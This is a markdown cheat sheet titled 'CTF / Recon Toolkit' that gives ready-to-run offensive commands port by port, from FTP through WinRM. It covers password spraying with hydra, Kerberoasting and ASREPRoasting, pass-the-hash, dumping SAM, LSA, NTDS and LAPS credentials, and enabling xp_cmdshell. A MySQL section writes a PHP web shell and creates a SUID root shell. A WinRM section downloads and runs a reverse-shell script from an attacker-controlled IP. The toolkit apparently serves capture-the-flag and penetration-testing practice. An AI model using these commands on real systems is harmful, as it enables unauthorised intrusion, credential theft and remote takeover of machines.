---
title: CTF / Recon Toolkit
subtitle: SUD0X0 - CTFTools

sidebar:
  - label: RECON
    items:
      - id: initial-scan
        text: "Initial Scan"
  - label: SERVICES
    items:
      - id: ftp
        text: "FTP [21]"
      - id: ssh
        text: "SSH [22]"
      - id: smtp
        text: "SMTP [25]"
      - id: dns
        text: "DNS [53]"
      - id: http
        text: "HTTP/S [80/443]"
      - id: kerberos
        text: "Kerberos [88]"
      - id: rpc
        text: "RPC/WMI [135]"
      - id: smb
        text: "SMB [445]"
      - id: snmp
        text: "SNMP [161]"
      - id: ldap
        text: "LDAP [389]"
      - id: mssql
        text: "MSSQL [1433]"
      - id: nfs
        text: "NFS [2049]"
      - id: mysql
        text: "MySQL [3306]"
      - id: rdp
        text: "RDP [3389]"
      - id: winrm
        text: "WinRM [5985]"
---

## INITIAL SCAN
<!-- id: initial-scan -->

### TCP — Full port scan

#### nmap | All ports, SYN scan, version + default scripts
```
sudo nmap <Target_IP> -p- -T4 -Pn -sV -sS -sC --open -oN <Target_IP>_TCP.txt -vv
```

### UDP scan

#### nmap | Top 200 UDP ports (full -p- is very slow)
```
sudo nmap <Target_IP> -sU --top-ports 200 -T4 -Pn --open -oN <Target_IP>_UDP.txt -vv
```

## FTP [port:21]
<!-- id: ftp -->

### Initial enum

#### nmap | All ftp-* scripts
```
sudo nmap <Target_IP> -n -Pn -p 21 -sV --script "ftp-*" -oN <Target_IP>_ftp.txt -vv
```

#### manual | Test anonymous login
```
ftp <Target_IP>
# Username: anonymous  Password: (blank)
```

### Network-wide sweep

#### nxc
```
nxc ftp <Target_IP>/24 -u user.txt -p password.txt --continue-on-success
```

### Password spraying

#### hydra | -L for user list, -l for single user
```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://<Target_IP> -t 4 -vV
```

### File listing & download (nxc)

#### nxc | List files
```
nxc ftp <Target_IP> -u <user> -p <pass> --ls
```

#### nxc | Download a file
```
nxc ftp <Target_IP> -u <user> -p <pass> --get <remote_file>
```

#### nxc | Upload a file
```
nxc ftp <Target_IP> -u <user> -p <pass> --put <local_file> <remote_path>
```

## SSH [port:22]
<!-- id: ssh -->

### Initial enum

#### nmap | Auth methods, host key, algorithms
```
sudo nmap <Target_IP> -n -Pn -p 22 -sV --script "ssh-auth-methods,ssh-hostkey,ssh2-enum-algos" -oN <Target_IP>_ssh.txt -vv
```

### Command execution (authenticated)

#### nxc | Run command over SSH
```
nxc ssh <Target_IP> -u <user> -p <pass> -x "id"
```

### Network-wide sweep

#### nxc
```
nxc ssh <Target_IP>/24 -u user.txt -p password.txt --continue-on-success
```

### Password spraying

#### hydra
```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://<Target_IP> -t 4 -vV
```

### File transfer (SCP)

#### scp | Local → Remote
```
scp local_file user@<Target_IP>:/remote/upload/folder/
```

#### scp | Remote → Local
```
scp user@<Target_IP>:/remote/file/path ./local_folder/
```

## SMTP [port:25 / 587]
<!-- id: smtp -->

### User enumeration [!HIGH-VALUE]

#### nmap | VRFY / EXPN / RCPT user enum
```
nmap <Target_IP> -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -vv
```

#### smtp-user-enum | -M VRFY | EXPN | RCPT
```
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <Target_IP> -p 25
```

### MX discovery

#### dig
```
dig +short mx <Target_Domain>
```

### Initial enum

#### nmap
```
sudo nmap <Target_IP> -n -Pn -p 25,587,465 -sV --script "smtp-*" -oN <Target_IP>_smtp.txt -vv
```

### Password spraying

#### hydra | SMTP port 25
```
hydra -L user.txt -P password.txt <Target_IP> smtp -vV
```

#### hydra | SMTPS port 587 with TLS
```
hydra -L user.txt -P password.txt -s 587 <Target_IP> smtp -S -vV
```

### Manual connection (Telnet)

#### telnet | Open relay test / send email
```
telnet <Target_IP> 25
EHLO attacker.local
# If auth required:
AUTH LOGIN
  <base64_username>
  <base64_password>
MAIL FROM:<attacker@attacker.local>
RCPT TO:<target@domain.com>
DATA
Subject: Test
Body here.
.
QUIT
```

## DNS [port:53]
<!-- id: dns -->

### Basic recon

#### dig | All records
```
dig <Target_Domain> @<Target_IP> any
```

#### dig | Version enumeration (CHAOS)
```
dig version.bind CHAOS TXT @<Target_IP>
```

#### dig | Reverse lookup
```
dig -x <Target_IP> @<Target_IP>
```

### Zone transfer [!HIGH-VALUE]

#### dig
```
dig AXFR <Target_Domain> @<Target_IP>
```

#### host
```
host -l <Target_Domain> <Target_IP>
```

### Automated

#### dnsrecon
```
dnsrecon -d <Target_Domain> -a -n <Target_IP>
```

## HTTP / HTTPS [port:80 / 443]
<!-- id: http -->

### Technology detection

#### nmap | HTTP service detection + common scripts
```
sudo nmap <Target_IP> -p 80,443,8080,8443 -sV --script "http-title,http-headers,http-methods,http-server-header,http-auth-finder" -vv
```

#### whatweb | Framework, CMS, version fingerprinting
```
whatweb http://<Target_IP> -a 3 -v
```

### Directory enumeration

#### ffuf
```
ffuf -u http://<Target_IP>:<Port>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 50 -c -o <Target_IP>_dirs.txt -of csv
```

### File enumeration

#### ffuf | Common extensions
```
ffuf -u http://<Target_IP>:<Port>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.html,.htm,.txt,.asp,.aspx,.jsp,.bak,.zip \
  -t 50 -c -o <Target_IP>_files.txt -of csv
```

### Subdomain / vhost enumeration

#### ffuf | Vhost fuzzing via Host header — filter default response size with -fs
```
ffuf -u http://<Target_IP> \
  -H "Host: FUZZ.<Target_Domain>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -t 50 -c -fs <default_response_size> -o <Target_IP>_vhosts.txt -of csv
```

#### ffuf | DNS subdomain bruteforce
```
ffuf -u http://FUZZ.<Target_Domain> \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -t 50 -c -o <Target_IP>_subdomains.txt -of csv
```

### Directory traversal / LFI

#### wordlists | Seclist LFI paths
```
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
```

### Password attacks

#### cewl | Generate wordlist from site
```
cewl http://<Target_IP> -d 3 -m 6 -w words.txt
```

#### hydra | HTTP POST form — check request in Burp first
```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt \
  <Target_IP> http-post-form \
  "/path/login.php:username=^USER^&password=^PASS^:F=Incorrect" -vV
```

#### hydra | HTTP GET form
```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt \
  <Target_IP> http-get-form \
  "/path/login.php:username=^USER^&password=^PASS^:F=Incorrect" -vV
```

#### hydra | Route through Burp proxy
```
export HYDRA_PROXY=http://127.0.0.1:8080
# Then run hydra as normal
```

### SQL Injection

#### sqlmap | GET parameter
```
sqlmap -u "http://<Target_IP>/page.php?id=1" --dbs --batch
```

#### sqlmap | POST — save request from Burp to file
```
sqlmap -r request.txt --dbs --batch --level 5 --risk 3
```

## KERBEROS [port:88]
<!-- id: kerberos -->

### User enumeration (no creds)

#### kerbrute | github.com/ropnop/kerbrute
```
./kerbrute userenum user.txt --dc <Target_IP> --domain <Domain> -o kerbrute_out.txt
```

### ASREPRoast (no creds) [!HIGH-VALUE]

#### impacket-GetNPUsers | No password — targets users with pre-auth disabled
```
impacket-GetNPUsers <Domain>/ -usersfile user.txt -no-pass -dc-ip <Target_IP> -format hashcat -outputfile asrep.hash
```

#### impacket-GetNPUsers | With valid creds — auto-discovers vulnerable users
```
impacket-GetNPUsers <Domain>/<user>:<pass> -dc-ip <Target_IP> -format hashcat -outputfile asrep.hash
```

> Crack with: hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

### Kerberoasting [!HIGH-VALUE]

#### impacket-GetUserSPNs | Requires valid domain credentials
```
impacket-GetUserSPNs <Domain>/<user>:<pass> -dc-ip <Target_IP> -request -outputfile kerberoast.hash
```

> Crack with: hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt

### Request TGT

#### impacket-getTGT
```
impacket-getTGT <Domain>/<user>:<pass> -dc-ip <Target_IP>
export KRB5CCNAME=$(pwd)/<user>.ccache
```

### AD user enumeration

#### impacket-GetADUsers
```
impacket-GetADUsers <Domain>/<user>:<pass> -dc-ip <Target_IP> -all
```

## RPC / WMI / DCOM [port:135]
<!-- id: rpc -->

### Initial enum

#### nmap | RPC / MSRPC scripts
```
sudo nmap <Target_IP> -n -Pn -p 135 -sV --script "msrpc-enum,rpc-grind,rpcinfo" -vv
```

### Null session enum

#### rpcclient
```
rpcclient -U '' -N <Target_IP> -c 'srvinfo;querydispinfo;enumdomusers;enumdomgroups;enumdomains;querydominfo'
```

### Endpoint mapping

#### impacket-rpcmap
```
impacket-rpcdump -target-ip <Target_IP> <Domain>/<user>:<password>
```

### SID / user enumeration

#### impacket-lookupsid | Brute force SIDs to enumerate users & groups
```
# Null session
impacket-lookupsid <Domain>/guest@<Target_IP> -no-pass
# Authenticated
impacket-lookupsid <Domain>/<user>:<pass>@<Target_IP>
```

#### impacket-samrdump | Dump SAM via SAMR protocol
```
impacket-samrdump <Domain>/<user>:<pass>@<Target_IP>
```

## SMB [port:139 / 445]
<!-- id: smb -->

### Initial enum

#### nxc | Null auth shares
```
nxc smb <Target_IP> -u '' -p '' --shares
```

#### nxc | Anonymous login (guest)
```
nxc smb <Target_IP> -u 'guest' -p '' --shares
```

#### nxc | Deep share spider
```
nxc smb <Target_IP> -u '' -p '' -M spider_plus
```

#### nxc | Users, groups, logged-on, password policy
```
nxc smb <Target_IP> -u '' -p '' --users --groups --pass-pol --loggedon-users --rid-brute
```

### Network-wide sweep + relay list

#### nxc
```
nxc smb <Target_IP>/24 -u user.txt -p password.txt --continue-on-success
```

#### nxc | Find hosts without SMB signing (relay targets)
```
nxc smb <Target_IP>/24 --gen-relay-list relay_targets.txt
```

### Vulnerability scan [!HIGH-VALUE]

#### nmap | EternalBlue, MS17-010, SMBGhost etc.
```
sudo nmap <Target_IP> -p 445 --script "smb-vuln-*" --script-args unsafe=1 -vv
```

#### nxc | Scan for known CVEs
```
nxc smb <Target_IP> -u <user> -p <pass> -M zerologon
nxc smb <Target_IP> -u <user> -p <pass> -M petitpotam
nxc smb <Target_IP> -u <user> -p <pass> -M nopac
```

### User enumeration

#### impacket-GetADUsers | Dump all AD users
```
impacket-GetADUsers <Domain>/<user>:<pass> -dc-ip <Target_IP> -all
```

#### impacket-samrdump | Dump users via SAMR
```
impacket-samrdump <Domain>/<user>:<pass>@<Target_IP>
```

#### nxc | RID brute — enumerate users via SID bruteforce
```
nxc smb <Target_IP> -u <user> -p <pass> --rid-brute | grep SidTypeUser
```

### Authentication (PTH)

#### nxc | Validate NT hash
```
nxc smb <Target_IP> -u <username> -H <NT_HASH>
```

#### impacket-smbclient | SMB client via PTH
```
impacket-smbclient <Domain>/<username>@<Target_IP> -hashes :<NT_HASH>
```

> NT hash is the second field: Administrator:500:aad3...:&lt;NT_HASH&gt;:::

### RCE via SMB

#### impacket-psexec | psexec / smbexec / wmiexec / atexec
```
impacket-psexec  <Domain>/<username>:<password>@<Target_IP>
impacket-smbexec <Domain>/<username>:<password>@<Target_IP>
impacket-wmiexec <Domain>/<username>:<password>@<Target_IP>
impacket-atexec  <Domain>/<username>:<password>@<Target_IP>  # Vista+
# Append -hashes :<NT_HASH> for PTH
```

### Credential dumping [!HIGH-VALUE]

#### impacket-secretsdump | Dump SAM, LSA, NTDS — requires admin
```
# Password
impacket-secretsdump <Domain>/<user>:<pass>@<Target_IP>
# Pass-the-Hash
impacket-secretsdump <Domain>/<user>@<Target_IP> -hashes :<NT_HASH>
```

#### nxc | SAM / LSA / NTDS dump
```
nxc smb <Target_IP> -u <user> -p <pass> --sam
nxc smb <Target_IP> -u <user> -p <pass> --lsa
nxc smb <Target_IP> -u <user> -p <pass> --ntds  # DC only
```

### Share ACLs

#### smbcacls
```
smbcacls //<Target_IP>/<ShareName> <FolderPath> --no-pass
```

## SNMP [port:161 / 162]
<!-- id: snmp -->

### Initial enum

#### nmap
```
sudo nmap -sU -p 161,162 -Pn <Target_IP>
```

#### snmp-check
```
snmp-check <Target_IP> -c public
```

#### snmpwalk | Walk full MIB tree
```
snmpwalk -c public -v1 <Target_IP>
snmpwalk -c public -v2c <Target_IP>
# Specific OID (e.g. system info)
snmpwalk -c public -v1 <Target_IP> 1.3.6.1.2.1.1
```

### Community string bruteforce

#### onesixtyone | Fast community string bruteforce
```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <Target_IP>
```

#### nmap | nmap snmp-brute script
```
sudo nmap -sU -p 161,162 --script snmp-brute <Target_IP> \
  --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

## LDAP [port:389 / 636]
<!-- id: ldap -->

### Initial enum

#### nmap
```
sudo nmap <Target_IP> -n -Pn -p 389 -sV --script "ldap* and not brute" -vv
```

#### ldapsearch | Unauthenticated
```
ldapsearch -x -H ldap://<Target_IP> -b "DC=<domain>,DC=<tld>"
```

#### ldapsearch | Bypass TLS SNI check
```
ldapsearch -H ldap://<Target_IP> -x -s base -b '' "(objectClass=*)" "*" +
```

#### ldapsearch | Authenticated
```
ldapsearch -x -H ldap://<Target_IP> \
  -b "DC=<domain>,DC=<tld>" \
  -D '<Domain>\<user>' -w '<password>'
```

### ASREPRoasting [!HIGH-VALUE]

#### nxc | No password required if preauth disabled
```
nxc ldap <Target_IP> -u user.txt -p '' --asreproast asreproast.txt --kdcHost <DC_FQDN>
```

#### hashcat | Crack AS-REP hashes (mode 18200)
```
hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting [!HIGH-VALUE]

#### nxc
```
nxc ldap <Target_IP> -u <user> -p <pass> --kerberoasting kerberoast.txt
```

#### hashcat | Crack TGS hashes (mode 13100)
```
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### DACL / ACL reads

#### nxc
```
# All ACEs for a target
nxc ldap <Target_IP> -u <user> -p <pass> --kdcHost <DC_FQDN> -M daclread -o TARGET=Administrator ACTION=read

# Rights a user has on Administrator
nxc ldap <Target_IP> -u <user> -p <pass> --kdcHost <DC_FQDN> -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=<username>

# Who has DCSync rights
nxc ldap <Target_IP> -u <user> -p <pass> --kdcHost <DC_FQDN> -M daclread -o TARGET=Administrator ACTION=read RIGHTS=DCSync
```

### LAPS password dump [!HIGH-VALUE]

#### nxc | Dump LAPS passwords
```
nxc ldap <Target_IP> -u <user> -p <pass> -M laps
```

#### ldapsearch | Query LAPS attribute directly
```
ldapsearch -x -H ldap://<Target_IP> \
  -D '<Domain>\<user>' -w '<pass>' \
  -b "DC=<domain>,DC=<tld>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

### AD user enumeration

#### impacket-GetADUsers | Dump all domain users
```
impacket-GetADUsers <Domain>/<user>:<pass> -dc-ip <Target_IP> -all
```

#### nxc | Enumerate users and groups via LDAP
```
nxc ldap <Target_IP> -u <user> -p <pass> --users
nxc ldap <Target_IP> -u <user> -p <pass> --groups
```

### Useful nxc LDAP flags

#### nxc
```
nxc ldap <Target_IP> -u <user> -p <pass> --kdcHost <DC_FQDN> \
  --admin-count          # List admin accounts
  -M maq                 # Machine Account Quota
  -M get-desc-users      # User descriptions
  -M adcs                # List PKI enrolment servers
  -M get-network         # Extract subnets
  -M ldap-checker        # Check LDAP signing
  -M enum_trusts         # Enumerate trust relationships
  --dc-list              # Get DC list
  -k --get-sid           # Domain SID
  --bloodhound --ns <IP> --collection All  # BloodHound ZIP
```

## MSSQL [port:1433]
<!-- id: mssql -->

### Initial enum

#### nmap
```
sudo nmap <Target_IP> -n -Pn -p 1433 -sV --script "ms-sql-*" -oN <Target_IP>_mssql.txt -vv
```

### Network-wide sweep

#### nxc
```
nxc mssql <Target_IP>/24 -u user.txt -p password.txt --continue-on-success
```

### Authentication

#### impacket-mssqlclient | SQL auth
```
impacket-mssqlclient -port 1433 <domain>/<username>:<password>@<Target_IP>
```

#### impacket-mssqlclient | Windows auth
```
impacket-mssqlclient -port 1433 <domain>/<username>:<password>@<Target_IP> -windows-auth
```

### Command execution (xp_cmdshell)

#### nxc | Execute OS command via MSSQL
```
nxc mssql <Target_IP> -u <user> -p <pass> -x "whoami"
```

#### impacket-mssqlclient | Enable and use xp_cmdshell interactively
```
# Inside impacket-mssqlclient session:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
# Shortcut using built-in:
enable_xp_cmdshell
xp_cmdshell whoami
```

## NFS [port:2049]
<!-- id: nfs -->

### Initial enum

#### nmap
```
sudo nmap <Target_IP> -n -Pn -p 2049 -sV --script "nfs-*" -vv
```

#### showmount | List exported shares
```
showmount -e <Target_IP>
```

#### nxc | NFS enumeration
```
nxc nfs <Target_IP> --shares
nxc nfs <Target_IP> --enum-shares
```

### Mounting

#### mount
```
sudo mount -t nfs -o nolock,rw,vers=3 <Target_IP>:/remote/share /mnt/nfs_share
```

## MySQL [port:3306]
<!-- id: mysql -->

### Initial enum

#### nmap
```
sudo nmap <Target_IP> -n -Pn -p 3306 -sV --script "mysql-*" -vv
```

### Password spraying

#### hydra
```
hydra -L user.txt -P password.txt <Target_IP> mysql -vV
```

### Authentication

#### mysql
```
mysql -h <Target_IP> -u root         # No password
mysql -h <Target_IP> -u root -p     # Prompt for password
```

### Post-exploitation

#### mysql | Read file (requires FILE priv)
```
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/lib/mysql-files/key.txt');
```

#### mysql | Write web shell
```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

#### mysql | SUID rootbash via UDF
```
SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
\! sh
```

## RDP [port:3389]
<!-- id: rdp -->

### Initial enum

#### nmap
```
sudo nmap <Target_IP> -n -Pn -p 3389 -sV --script "rdp-*" -vv
```

### Network-wide sweep

#### nxc
```
nxc rdp <Target_IP>/24 -u user.txt -p password.txt --continue-on-success
```

### Enable restricted admin (PTH)

#### PowerShell | Run on target — enables RDP PTH
```
New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' `
  -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD -Force
```

### Connect

#### xfreerdp | Password
```
xfreerdp /v:<Target_IP> /u:<username> /p:<password> /cert:ignore +clipboard /dynamic-resolution
```

#### xfreerdp | Pass-the-Hash
```
xfreerdp /v:<Target_IP> /u:<username> /pth:<NT_HASH> /cert:ignore +clipboard /dynamic-resolution
```

### Screenshot without NLA (no creds)

#### nxc | Capture screenshot of RDP login screen
```
nxc rdp <Target_IP> --screenshot --screentime 5
```

#### nxc | Screenshot after auth
```
nxc rdp <Target_IP> -u <user> -p <pass> --screenshot --screentime 5
```

## WINRM [port:5985 / 5986]
<!-- id: winrm -->

### Password spraying

#### nxc
```
nxc winrm <Target_IP> -u user.txt -p password.txt --continue-on-success
```

### Enable WinRM

#### PowerShell | On local machine
```
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
```

### Authentication

#### evil-winrm | Password
```
evil-winrm -i <Target_IP> -u <username> -p '<password>'
```

#### evil-winrm | Pass-the-Hash
```
evil-winrm -i <Target_IP> -u <username> -H '<NT_HASH>'
```

### Remote execution (PowerShell)

#### Invoke-Command | Run command on remote host
```
Invoke-Command -ComputerName <hostname> -ScriptBlock { ipconfig /all } -Credential <DOMAIN\user>
```

#### Invoke-Command | Download and exec reverse shell
```
Invoke-Command -ComputerName <hostname> -ScriptBlock {
  cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>:8080/rev.ps1')"
}
```

### Command execution (nxc)

#### nxc | Run cmd command
```
nxc winrm <Target_IP> -u <user> -p <pass> -x "whoami"
```

#### nxc | Run PowerShell command
```
nxc winrm <Target_IP> -u <user> -p <pass> -X "Get-Process"
```
